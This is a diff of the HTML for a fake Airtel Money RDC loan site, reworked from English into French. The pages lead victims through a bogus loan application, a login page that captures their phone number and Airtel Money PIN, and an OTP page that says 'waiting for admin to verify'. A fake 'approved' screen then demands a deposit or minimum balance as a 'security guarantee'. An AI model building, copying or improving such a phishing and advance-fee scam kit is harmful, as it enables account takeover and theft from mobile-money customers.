-      </div>
+  <div class="main-card">
+    <div class="card-header-row">
+      <div class="card-title-group"><span>✦</span> Infos Personnelles</div>
+      <div class="tag-badge">Étape 2 sur 3</div>
+    </div>
+    <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+
+    <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
+    
+    <div class="field-row">
+      <div class="field"><label>Prénom</label><input type="text" id="s2fi" placeholder="Ex: Jean" oninput="clearErr('s2Err')"></div>
+      <div class="field"><label>Nom de famille</label><input type="text" id="s2la" placeholder="Ex: Kabamba" oninput="clearErr('s2Err')"></div>
+    </div>
+    <div class="field">
+      <label>Numéro de Téléphone Airtel DRC</label>
+      <div class="phone-row"><div class="ph-pre">🇨🇩 +243</div><input type="tel" id="s2ph" placeholder="971234567" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
+      <div class="field-hint">Saisissez votre numéro à 9 chiffres commençant par 9 ou 8 (ex: 971234567)</div>
+    </div>
+
+    <div class="step-btns">
+      <button class="btn-gray" onclick="goTo('page-step1')">PRÉCÉDENT</button>
+      <button class="btn-grad" onclick="toS3()">SUIVANT ➔</button>
     </div>
   </div>
-  <div class="pg-footer">© 2026 Airtel Congo</div>
+
+  <div class="pg-footer">© 2026 Airtel Money RDC</div>
 </div>
 
-<!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
+<!-- PAGE STEP 3 -->
 <div id="page-step3" class="page">
-  <header class="brand-header">
-    <div class="brand-logo-area">
-      <div class="brand-logo-mark">a</div>
-      <div class="brand-text-group">
-        <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_loan_app">Loan Application</span>
-      </div>
+  <nav class="navbar">
+    <a class="nav-left" onclick="goTo('page-step2')">← Retour</a>
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+      <div class="brand">Airtel Money</div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-step2')" data-i18n="nav_back">Back</div>
-  </header>
+    <div class="nav-right"><div class="hline"></div><div class="hline"></div></div>
+  </nav>
 
-  <div class="step-center">
-    <div class="step-card">
-      <h2 data-i18n="lbl_loan_app">Loan Application</h2>
-      <p class="step-sub" data-i18n="step_3_sub">Step 3 of 3</p>
-      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
-      <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
-      <div class="field"><label data-i18n="field_emp_status">Employment Status</label><div class="sel-wrap"><select id="s3em"><option data-i18n="emp_employed">Employed</option><option selected data-i18n="emp_self">Self-Employed</option><option data-i18n="emp_unemployed">Unemployed</option><option data-i18n="emp_retired">Retired</option><option data-i18n="emp_student">Student</option></select></div></div>
-      <div class="field"><label data-i18n="field_annual_income">Annual Income ($)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')"></div>
-      <div class="sum-box">
-        <h3 data-i18n="sum_title">Application Summary</h3>
-        <div class="sum-row"><span class="sk" data-i18n="sum_amt">Loan Amount:</span><span class="sv" id="sA">$1,000</span></div>
-        <div class="sum-row"><span class="sk" data-i18n="sum_term">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
-        <div class="sum-row"><span class="sk" data-i18n="sum_purpose">Purpose:</span><span class="sv" id="sP">—</span></div>
-        <div class="sum-row"><span class="sk" data-i18n="sum_applicant">Applicant:</span><span class="sv" id="sN">—</span></div>
-      </div>
-      <div class="step-btns">
-        <button class="btn-gray" onclick="goTo('page-step2')" data-i18n="btn_prev">PREVIOUS</button>
-        <button class="btn-grad" onclick="submitApp()" data-i18n="btn_submit">SUBMIT APPLICATION</button>
-      </div>
+  <div class="main-card">
+    <div class="card-header-row">
+      <div class="card-title-group"><span>✦</span> Emploi & Résumé</div>
+      <div class="tag-badge">Étape 3 sur 3</div>
+    </div>
+    <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+
+    <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
+
+    <div class="field"><label>Statut Professionnel</label><div class="sel-wrap"><select id="s3em"><option>Employé / Salarié</option><option selected>Commerçant / Indépendant</option><option>Sans emploi</option><option>Retraité</option><option>Étudiant</option></select></div></div>
+    <div class="field"><label>Revenu Annuel Estimé ($)</label><input type="number" id="s3in" placeholder="Entrez le revenu annuel" oninput="clearErr('s3Err')"></div>
+
+    <div class="sum-box">
+      <h3>Résumé de la demande</h3>
+      <div class="sum-row"><span class="sk">Montant du prêt:</span><span class="sv" id="sA">$ 1,000</span></div>
+      <div class="sum-row"><span class="sk">Durée:</span><span class="sv" id="sT">48 Mois</span></div>
+      <div class="sum-row"><span class="sk">Motif:</span><span class="sv" id="sP">—</span></div>
+      <div class="sum-row"><span class="sk">Demandeur:</span><span class="sv" id="sN">—</span></div>
+    </div>
+
+    <div class="step-btns">
+      <button class="btn-gray" onclick="goTo('page-step2')">PRÉCÉDENT</button>
+      <button class="btn-grad" onclick="submitApp()">SOUMETTRE ➔</button>
     </div>
   </div>
-  <div class="pg-footer">© 2026 Airtel Congo</div>
+
+  <div class="pg-footer">© 2026 Airtel Money RDC</div>
 </div>
 
-<!-- ══════════════════════ PAGE 5: SUBMITTED ══════════════════════ -->
+<!-- PAGE SUBMITTED -->
 <div id="page-submitted" class="page">
   <div class="sub-wrap">
-    <div class="sub-icon">🧾</div>
-    <h2 data-i18n="sub_title">Verification Required</h2>
-    <p data-i18n="sub_desc">Your loan application has been received and is currently on hold. <br>To proceed with disbursement, <strong>please verify your Airtel Money credentials</strong> to ensure successful account validation.</p>
-    <div class="redir-pill"><span data-i18n="sub_redirect">Redirecting to secure verification in</span> <span class="redir-n" id="rdN">3</span>s...</div><br>
-    <button class="btn-go" onclick="goTo('page-login')" data-i18n="sub_btn_login">Proceed to Verification</button>
+    <div class="sub-icon">📋</div>
+    <h2>Demande Soumise avec Succès</h2>
+    <p>Votre demande de prêt Airtel Money a bien été enregistrée.<br>Redirection vers la vérification sécurisée en cours...</p>
+    <div class="redir-pill">🔄 Redirection dans <span class="redir-n" id="rdN">3</span>s...</div><br>
+    <button class="btn-go" onclick="goTo('page-login')">Se Connecter Maintenant</button>
   </div>
+
+  <div class="pg-footer">© 2026 Airtel Money RDC</div>
 </div>
-<!-- ══════════════════════ PAGE 6: LOGIN ══════════════════════ -->
+
+<!-- PAGE LOGIN -->
 <div id="page-login" class="page">
-  <header class="brand-header">
-    <div class="brand-logo-area">
-      <div class="brand-logo-mark">a</div>
-      <div class="brand-text-group">
-        <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_secure_portal">Secure Portal</span>
-      </div>
+  <div class="brand-header">
+    <div class="brand-icon-wrap">
+      <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-landing')" data-i18n="nav_home">Home</div>
-  </header>
-
-  <div class="login-body-wrap">
-    <h2 data-i18n="login_h2">Account Login</h2>
-    <div class="login-inner">
-      <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
-
-      <div class="lg-phone-row">
-        <div class="lg-ph-pre">🇨🇩 +243</div>
-        <input type="tel" id="lgPh" placeholder="812345678" maxlength="9" oninput="normalizePhone('lgPh');chkLogin()">
-      </div>
-      <div class="pin-label" data-i18n="login_pin_lbl">Enter your PIN (4 characters)</div>
-      <div class="pin-row">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" id="p2">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
-        <button class="pin-eye" onclick="togPin()">👁</button>
-      </div>
-      <div class="forgot-pin" data-i18n="login_forgot">Forgot PIN?</div>
-      <button class="btn-login" id="bLogin" onclick="doLogin()" data-i18n="login_btn">LOGIN</button>
-    </div>
+    <h1 class="brand-title">Airtel Money</h1>
+    <p class="brand-subtitle">Connexion à votre espace client</p>
   </div>
-  <div class="lg-curve">
-    <div class="lg-foot">
-      <div class="brand-logo-area" style="justify-content:center;">
-        <div class="brand-logo-mark" style="background:#fff; color:var(--airtel-red); width:32px; height:32px; font-size:1rem;">a</div>
-        <span class="brand-title" style="color:#fff;">Airtel Congo</span>
-      </div>
-      <div class="lg-version">v2.1.3P</div>
-      <div class="lg-terms"><span data-i18n="terms_text">By signing in you agree to the</span> <a href="#" data-i18n="terms_link">Terms and Conditions</a></div>
+
+  <div class="login-card">
+    <h2>Connexion Compte</h2>
+    <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
+
+    <div class="lg-phone-row">
+      <div class="ph-pre">🇨🇩 +243</div>
+      <input type="tel" id="lgPh" placeholder="971234567" maxlength="9" oninput="normalizePhone('lgPh');chkLogin()" style="border-radius: 0 var(--radius-sm) var(--radius-sm) 0; border-left: none;">
     </div>
+
+    <div class="pin-label">Entrez votre code PIN (4 chiffres)</div>
+    <div class="pin-row">
+      <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
+      <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
+      <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" id="p2">
+      <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
+      <button class="pin-eye" onclick="togPin()">👁</button>
+    </div>
+
+    <div class="forgot-pin">Code PIN oublié?</div>
+    <button class="btn-login" id="bLogin" onclick="doLogin()">SE CONNECTER</button>
+  </div>
+
+  <div class="pg-footer">
+    v2.4.1CD • En vous connectant vous acceptez nos <a href="#" style="color:#fff;">Conditions d'utilisation</a><br>
+    © 2026 Airtel Money RDC
   </div>
 </div>
 
-<!-- ══════════════════════ PAGE 7: OTP ══════════════════════ -->
+<!-- PAGE OTP -->
 <div id="page-otp" class="page">
-  <header class="brand-header">
-    <div class="brand-logo-area">
-      <div class="brand-logo-mark">a</div>
-      <div class="brand-text-group">
-        <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_security_ver">Security Verification</span>
-      </div>
+  <nav class="navbar">
+    <a class="nav-left" onclick="goTo('page-login')">← Retour</a>
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+      <div class="brand">Airtel Money</div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-login')" data-i18n="nav_back">Back</div>
-  </header>
+    <div class="nav-right"><div class="hline"></div><div class="hline"></div></div>
+  </nav>
 
-  <div class="otp-body-wrap">
-    <div class="otp-card">
-      <h2 data-i18n="otp_h2">OTP Verification</h2>
-      <p class="otp-hint" data-i18n="otp_hint">Enter the OTP sent to your phone number</p>
-      <div class="otp-phone" id="otpPh">+243812345678</div>
+  <div class="otp-card">
+    <div class="otp-icon-shield">💬</div>
+    <h2>Vérification OTP</h2>
+    <p class="otp-hint">Saisissez le code de sécurité à 4 chiffres envoyé sur votre numéro Airtel</p>
+    <div class="otp-phone-badge">📱 <span id="otpPh">+243 971 234 567</span></div>
 
-      <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
-      <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
-      <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>
+    <div class="msg-box error" id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
+    <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
+    <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>
 
-      <div class="waiting-box" id="pinWait">
-        <div class="wb-spinner"></div>
-        <p data-i18n="otp_waiting">Waiting for admin to verify your details…</p>
+    <div class="waiting-box" id="pinWait">
+      <div class="wb-spinner"></div>
+      <p>En attente de validation du serveur Airtel…</p>
+    </div>
+
+    <div id="otpInputSection">
+      <div class="otp-inputs">
+        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,0)" id="o0" autocomplete="off">
+        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,1)" id="o1" autocomplete="off">
+        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,2)" id="o2" autocomplete="off">
+        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,3)" id="o3" autocomplete="off">
       </div>
-
-      <div id="otpInputSection">
-        <div class="otp-inputs">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,0)" id="o0">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,1)" id="o1">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
-        </div>
-        <div class="otp-resend" id="otpRs"><span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">17</span> <span data-i18n="otp_seconds">seconds</span></div>
-        <button class="btn-otp" id="bOtp" onclick="doOtp()" data-i18n="otp_submit">SUBMIT</button>
-      </div>
+      <div class="otp-resend" id="otpRs">Renvoyer le code dans <span id="rsS">30</span> secondes</div>
+      <button class="btn-otp" id="bOtp" onclick="doOtp()">VALIDER OTP</button>
     </div>
   </div>
-  <div class="otp-curve"><div class="otp-foot">© 2026 Airtel Congo</div></div>
+
+  <div class="pg-footer">© 2026 Airtel Money RDC</div>
 </div>
 
-<!-- ══════════════════════ PAGE 8: APPROVAL ══════════════════════ -->
+<!-- PAGE APPROVAL -->
 <div id="page-approval" class="page">
   <div class="appr-wrap">
-    <div class="appr-top">
+    <div class="appr-header">
       <div class="check-circle">✓</div>
-      <div class="appr-title" data-i18n="appr_congrats">🎉 Congratulations!</div>
-      <div class="appr-sub"><span data-i18n="appr_sub1">Your loan has been</span> <strong data-i18n="appr_approved">approved!</strong> <span data-i18n="appr_sub2">The funds will be disbursed shortly.</span></div>
-      <div class="appr-banner"><div class="abl" data-i18n="appr_banner_lbl">APPROVED AMOUNT</div><div class="aba" id="apAmt">$1,000</div></div>
+      <div class="appr-title">Félicitations! Prêt Approuvé</div>
+      <div class="appr-sub">Dernière étape pour recevoir vos fonds sur votre compte Airtel Money.</div>
     </div>
+
+    <div class="appr-banner">
+      <div class="abl">MONTANT APPROUVÉ</div>
+      <div class="aba" id="apAmt">$ 1,000</div>
+    </div>
+
     <div class="comp-box">
-      <div class="ch" data-i18n="comp_notice">⚠️ COMPLIANCE NOTICE</div>
-      <p><span data-i18n="comp_text1">Your Airtel account must be active and maintain a security deposit of at least</span> <strong data-i18n="comp_text2">20% of your requested loan amount.</strong> <span data-i18n="comp_text3">This deposit is fully refundable upon successful loan repayment and helps secure better interest rates.</span></p>
+      <div class="ch">🔒 VÉRIFICATION DE SÉCURITÉ</div>
+      <p>Pour débloquer votre transfert instantané, veuillez vous assurer d'avoir un solde d'au moins <span class="deposit-badge">$ 100</span> sur votre compte Airtel Money RDC.</p>
+      <p style="margin-top: 6px;">Cette somme sert de <strong>garantie de sécurité temporaire</strong> et demeure accessible sur votre compte.</p>
+      <div class="comp-note"><em>💡 Note:</em> Une fois le dépôt effectué, cliquez sur <strong>CONFIRMER & RECEVOIR</strong> ci-dessous.</div>
     </div>
+
     <div class="ld-card">
-      <div class="ld-htitle" data-i18n="ld_title">💳 Loan Details</div>
-      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl" data-i18n="ld_monthly">MONTHLY PAYMENT</div><div class="ld-val" id="apMthly">$27.50</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl" data-i18n="ld_term">LOAN TERM</div><div class="ld-val" id="apTerm">48 Months</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-p">📈</div><div><div class="ld-lbl" data-i18n="ld_interest">INTEREST RATE</div><div class="ld-val">12% APR</div></div></div>
+      <div class="ld-htitle">📋 Détails de votre Prêt</div>
+      <div class="ld-row">
+        <div class="ld-icon ic-g">💵</div>
+        <div>
+          <div class="ld-lbl">ECHÉANCE MENSUELLE</div>
+          <div class="ld-val" id="apMthly">$ 23</div>
+        </div>
+      </div>
+      <div class="ld-row">
+        <div class="ld-icon ic-b">📅</div>
+        <div>
+          <div class="ld-lbl">DURÉE DU PRÊT</div>
+          <div class="ld-val" id="apTerm">48 Mois</div>
+        </div>
+      </div>
+      <div class="ld-row">
+        <div class="ld-icon ic-p">📈</div>
+        <div>
+          <div class="ld-lbl">TAUX D'INTÉRÊT</div>
+          <div class="ld-val">5% l'an (Fixe)</div>
+        </div>
+      </div>
     </div>
+
     <div class="qa-wrap">
-      <div class="qa-title" data-i18n="qa_title">Quick Actions</div>
-      <button class="qa-btn" data-i18n="qa_deposit">💰 Deposit Funds</button>
-      <button class="qa-btn" data-i18n="qa_withdraw">💸 Withdraw Funds</button>
-      <button class="qa-btn" data-i18n="qa_details">📄 Loan Details</button>
+      <div class="qa-title">Services Rapides</div>
+      <button class="qa-btn">💳 Consulter Mon Solde</button>
+      <button class="qa-btn">📄 Télécharger le Contrat de Prêt</button>
     </div>
-    <div class="nxt-steps"><span>📱</span><p><strong data-i18n="nxt_title">Next Steps:</strong><br><span data-i18n="nxt_desc">You will receive an SMS and email with disbursement details within 24 hours.</span></p></div>
-    <div class="rth-wrap"><button class="rth-btn" onclick="goTo('page-landing')" data-i18n="rth_btn">🏠 Return to Home</button></div>
+
+    <div class="nxt-steps">
+      <span>🔔</span>
+      <p><strong>Transfert Instantané:</strong> Une confirmation SMS vous sera envoyée dès le déboursement sur votre numéro Airtel.</p>
+    </div>
+
+    <div class="rth-wrap">
+      <a href="#" class="reapply-btn-pro" onclick="alert('Transaction en cours de finalisation...')">
+        🔄 CONFIRMER & RECEVOIR
+      </a>
+      <button class="rth-btn" onclick="goTo('page-landing')">🏠 Accueil</button>
+    </div>
+  </div>
+
+  <div class="pg-footer">© 2026 Airtel Money RDC</div>
+</div>
+
+<!-- LIVE POPUP NOTIFICATION -->
+<div id="popup" class="live-popup">
+  <div class="popup-avatar" id="popup-avatar">A</div>
+  <div class="popup-content">
+    <div id="popup-text" class="popup-text"></div>
+    <div id="popup-time" class="popup-time">À l'instant</div>
   </div>
 </div>
 
-<!-- MODALS -->
+<!-- MODAL OVERLAYS -->
 <div class="overlay" id="mLogin">
-  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_wait">Please wait…</h3><p data-i18n="modal_sending">Sending your details for verification</p></div>
+  <div class="modal"><div class="spinner"></div><h3>Veuillez patienter…</h3><p>Connexion et vérification des données</p></div>
 </div>
 <div class="overlay" id="mOtp">
-  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_verifying_otp">Verifying OTP</h3><p id="otpVT">Please wait… (3s)</p></div>
+  <div class="modal"><div class="spinner"></div><h3>Vérification du code OTP</h3><p id="otpVT">Veuillez patienter… (3s)</p></div>
 </div>
 <div class="overlay" id="mSubmit">
-  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_submitting">Submitting Application…</h3><p data-i18n="modal_processing">Please wait while we process your application</p></div>
+  <div class="modal"><div class="spinner"></div><h3>Envoi de la demande…</h3><p>Traitement sécurisé de votre dossier</p></div>
+</div>
+
 </div>
 
 <script>
-  // ══════════════════════════════════════════════════════
-  // LOCALIZATION DICTIONARIES (English, Kiswahili Congo, French Congo)
-  // ══════════════════════════════════════════════════════
-  const translations = {
-    en: {
-      lang_label: "🌐 English",
-      lbl_financial_services: "Financial Services",
-      lbl_loan_app: "Loan Application",
-      lbl_secure_portal: "Secure Portal",
-      lbl_security_ver: "Security Verification",
-      nav_signin: "Sign In",
-      nav_home: "Home",
-      nav_back: "Back",
-      land_h1: "Get Your Loan Approved Fast",
-      land_sub: "Quick approval • Competitive rates • Flexible terms",
-      calc_title: "Loan Calculator",
-      calc_amt: "Loan Amount",
-      calc_term: "Loan Term",
-      calc_6m: "6 months",
-      calc_60m: "60 months",
-      calc_monthly: "Monthly Payment",
-      btn_apply_now: "APPLY NOW",
-      feat_fast: "Fast Approval",
-      feat_fast_sub: "Within 24 hours",
-      feat_rates: "Low Rates",
-      feat_rates_sub: "From 12%",
-      feat_secure: "Secure",
-      feat_secure_sub: "Bank-level",
-      step_1_sub: "Step 1 of 3",
-      step_2_sub: "Step 2 of 3",
-      step_3_sub: "Step 3 of 3",
-      field_loan_type: "Loan Type",
-      opt_personal: "Personal Loan",
-      opt_business: "Business Loan",
-      opt_home: "Home Loan",
-      opt_car: "Car Loan",
-      opt_edu: "Education Loan",
-      field_loan_amt: "Loan Amount ($)",
-      field_loan_term: "Loan Term",
-      field_purpose: "Purpose of Loan",
-      btn_next: "NEXT STEP",
-      btn_prev: "PREVIOUS",
-      field_fname: "First Name",
-      field_lname: "Last Name",
-      field_phone: "Phone Number",
-      phone_hint: "Enter 9 digits for DRC",
-      field_emp_status: "Employment Status",
-      emp_employed: "Employed",
-      emp_self: "Self-Employed",
-      emp_unemployed: "Unemployed",
-      emp_retired: "Retired",
-      emp_student: "Student",
-      field_annual_income: "Annual Income ($)",
-      sum_title: "Application Summary",
-      sum_amt: "Loan Amount:",
-      sum_term: "Loan Term:",
-      sum_purpose: "Purpose:",
-      sum_applicant: "Applicant:",
-      btn_submit: "SUBMIT APPLICATION",
-      sub_title: "Loan Application Submitted",
-      sub_desc: "Your loan application has been submitted. Please wait for approval.<br>You will receive a confirmation message. For now, proceed to Airtel Money.",
-      sub_redirect: "Redirecting to Airtel login in",
-      sub_btn_login: "Go to Login Now",
-      login_h2: "Account Login",
-      login_pin_lbl: "Enter your PIN (4 characters)",
-      login_forgot: "Forgot PIN?",
-      login_btn: "LOGIN",
-      terms_text: "By signing in you agree to the",
-      terms_link: "Terms and Conditions",
-      otp_h2: "OTP Verification",
-      otp_hint: "Enter the OTP sent to your phone number",
-      otp_waiting: "Waiting for admin to verify your details…",
-      otp_resend_in: "Resend code in",
-      otp_seconds: "seconds",
-      otp_submit: "SUBMIT",
-      appr_congrats: "🎉 Congratulations!",
-      appr_sub1: "Your loan has been",
-      appr_approved: "approved!",
-      appr_sub2: "The funds will be disbursed shortly.",
-      appr_banner_lbl: "APPROVED AMOUNT",
-      comp_notice: "⚠️ COMPLIANCE NOTICE",
-      comp_text1: "Your Airtel account must be active and maintain a security deposit of at least",
-      comp_text2: "10% of your requested loan amount.",
-      comp_text3: "This deposit is fully refundable upon successful loan repayment and helps secure better interest rates.",
-      ld_title: "💳 Loan Details",
-      ld_monthly: "MONTHLY PAYMENT",
-      ld_term: "LOAN TERM",
-      ld_interest: "INTEREST RATE",
-      qa_title: "Quick Actions",
-      qa_deposit: "💰 Deposit Funds",
-      qa_withdraw: "💸 Withdraw Funds",
-      qa_details: "📄 Loan Details",
-      nxt_title: "Next Steps:",
-      nxt_desc: "You will receive an SMS and email with disbursement details within 24 hours.",
-      rth_btn: "🏠 Return to Home",
-      modal_wait: "Please wait…",
-      modal_sending: "Sending your details for verification",
-      modal_verifying_otp: "Verifying OTP",
-      modal_submitting: "Submitting Application…",
-      modal_processing: "Please wait while we process your application"
-    },
-    sw: {
-      lang_label: "🌐 Kiswahili",
-      lbl_financial_services: "Huduma za Kifedha",
-      lbl_loan_app: "Maombi ya Mkopo",
-      lbl_secure_portal: "Lango Salama",
-      lbl_security_ver: "Uthibitishaji wa Usalama",
-      nav_signin: "Ingia",
-      nav_home: "Nyumbani",
-      nav_back: "Rudi",
-      land_h1: "Pata Mkopo Wako Umeidhinishwa Haraka",
-      land_sub: "Uidhinishaji wa haraka • Riba nafuu • Masharti rahisi",
-      calc_title: "Kikokotoo cha Mkopo",
-      calc_amt: "Kiasi cha Mkopo",
-      calc_term: "Muda wa Mkopo",
-      calc_6m: "miezi 6",
-      calc_60m: "miezi 60",
-      calc_monthly: "Malipo ya Kila Mwezi",
-      btn_apply_now: "OMBA SASA",
-      feat_fast: "Uidhinishaji wa Haraka",
-      feat_fast_sub: "Ndani ya saa 24",
-      feat_rates: "Riba Nafuu",
-      feat_rates_sub: "Kuanzia 12%",
-      feat_secure: "Salama",
-      feat_secure_sub: "Kiwango cha benki",
-      step_1_sub: "Hatua ya 1 kati ya 3",
-      step_2_sub: "Hatua ya 2 kati ya 3",
-      step_3_sub: "Hatua ya 3 kati ya 3",
-      field_loan_type: "Aina ya Mkopo",
-      opt_personal: "Mkopo wa Binafsi",
-      opt_business: "Mkopo wa Biashara",
-      opt_home: "Mkopo wa Nyumba",
-      opt_car: "Mkopo wa Gari",
-      opt_edu: "Mkopo wa Elimu",
-      field_loan_amt: "Kiasi cha Mkopo ($)",
-      field_loan_term: "Muda wa Mkopo",
-      field_purpose: "Madhumuni ya Mkopo",
-      btn_next: "HATUA INAYOFUATA",
-      btn_prev: "ILIYOPITA",
-      field_fname: "Jina la Kwanza",
-      field_lname: "Jina la Mwisho",
-      field_phone: "Namba ya Simu",
-      phone_hint: "Weka namba 9 za Kongo (DRC)",
-      field_emp_status: "Hali ya Ajira",
-      emp_employed: "Nimeajiriwa",
-      emp_self: "Nimejiajiri",
-      emp_unemployed: "Sina Ajira",
-      emp_retired: "Mstaafu",
-      emp_student: "Mwanafunzi",
-      field_annual_income: "Mapato ya Kila Mwaka ($)",
-      sum_title: "Muhtasari wa Maombi",
-      sum_amt: "Kiasi cha Mkopo:",
-      sum_term: "Muda wa Mkopo:",
-      sum_purpose: "Madhumuni:",
-      sum_applicant: "Mwombaji:",
-      btn_submit: "WASILISHA MAOMBI",
-      sub_title: "Maombi ya Mkopo Yamewasilishwa",
-      sub_desc: "Maombi yako yamewasilishwa. Tafadhali subiri uidhinishaji.<br>Utapokea ujumbe wa uthibitisho. Kwa sasa, endelea na Airtel Money.",
-      sub_redirect: "Inaelekezwa kwenye kuingia kwa Airtel baada ya sekunde",
-      sub_btn_login: "Nenda Kuingia Sasa",
-      login_h2: "Kuingia kwenye Akaunti",
-      login_pin_lbl: "Weka PIN yako (tarakimu 4)",
-      login_forgot: "Umesahau PIN?",
-      login_btn: "INGIA",
-      terms_text: "Kwa kuingia unakubaliana na",
-      terms_link: "Sheria na Masharti",
-      otp_h2: "Uthibitishaji wa OTP",
-      otp_hint: "Weka namba ya OTP iliyotumwa kwenye simu yako",
-      otp_waiting: "Inasubiri msimamizi athibitishe maelezo yako…",
-      otp_resend_in: "Tuma tena msimbo baada ya",
-      otp_seconds: "sekunde",
-      otp_submit: "WASILISHA",
-      appr_congrats: "🎉 Hongera!",
-      appr_sub1: "Mkopo wako",
-      appr_approved: "umeidhinishwa!",
-      appr_sub2: "Fedha zitatolewa hivi karibuni.",
-      appr_banner_lbl: "KIASI KILICHOIDHINISHWA",
-      comp_notice: "⚠️ TAHADHARI YA UTII",
-      comp_text1: "Akaunti yako ya Airtel lazima iwe hai na iwe na amana ya usalama ya angalau",
-      comp_text2: "10% ya kiasi cha mkopo ulichoomba.",
-      comp_text3: "Amana hii inarejeshwa kikamilifu baada ya kulipa mkopo kwa mafanikio na husaidia kupata viwango bora vya riba.",
-      ld_title: "💳 Maelezo ya Mkopo",
-      ld_monthly: "MALIPO YA KILA MWEZI",
-      ld_term: "MUDA WA MKOPO",
-      ld_interest: "KIWANGO CHA RIBA",
-      qa_title: "Vitendo vya Haraka",
-      qa_deposit: "💰 Weka Pesa",
-      qa_withdraw: "💸 Toa Pesa",
-      qa_details: "📄 Maelezo ya Mkopo",
-      nxt_title: "Hatua Zinazofuata:",
-      nxt_desc: "Utapokea SMS na barua pepe yenye maelezo ya utoaji ndani ya saa 24.",
-      rth_btn: "🏠 Rudi Nyumbani",
-      modal_wait: "Tafadhali subiri…",
-      modal_sending: "Inatuma maelezo yako kwa ajili ya uthibitishaji",
-      modal_verifying_otp: "Inathibitisha OTP",
-      modal_submitting: "Inawasilisha Maombi…",
-      modal_processing: "Tafadhali subiri tunapochakata maombi yako"
-    },
-    fr: {
-      lang_label: "🇫🇷 Français",
-      lbl_financial_services: "Services Financiers",
-      lbl_loan_app: "Demande de Prêt",
-      lbl_secure_portal: "Portail Sécurisé",
-      lbl_security_ver: "Vérification de Sécurité",
-      nav_signin: "Connexion",
-      nav_home: "Accueil",
-      nav_back: "Retour",
-      land_h1: "Obtenez Votre Prêt Rapidement",
-      land_sub: "Approbation rapide • Taux compétitifs • Termes flexibles",
-      calc_title: "Calculateur de Prêt",
-      calc_amt: "Montant du Prêt",
-      calc_term: "Durée du Prêt",
-      calc_6m: "6 mois",
-      calc_60m: "60 mois",
-      calc_monthly: "Paiement Mensuel",
-      btn_apply_now: "DEMANDER MAINTENANT",
-      feat_fast: "Approbation Rapide",
-      feat_fast_sub: "Sous 24 heures",
-      feat_rates: "Taux Bas",
-      feat_rates_sub: "À partir de 12%",
-      feat_secure: "Sécurisé",
-      feat_secure_sub: "Niveau bancaire",
-      step_1_sub: "Étape 1 sur 3",
-      step_2_sub: "Étape 2 sur 3",
-      step_3_sub: "Étape 3 sur 3",
-      field_loan_type: "Type de Prêt",
